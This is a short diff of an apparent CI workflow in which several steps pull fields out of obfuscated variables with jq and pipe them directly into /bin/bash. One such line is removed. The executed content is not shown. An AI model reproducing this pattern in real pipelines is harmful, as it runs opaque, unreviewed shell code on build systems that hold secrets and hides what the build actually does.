@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$m966" | jq -r .hxsyx78776 | /bin/bash
           echo $sgge6343 | jq -r .p053 | /bin/bash
           printf '%s' "$l2" | jq -r .iy9 | /bin/bash
-          echo $cj5 | jq -r .obhal739 | /bin/bash
           echo $pgse2815 | jq -r .s391 | /bin/bash
 
       - name: Archive results
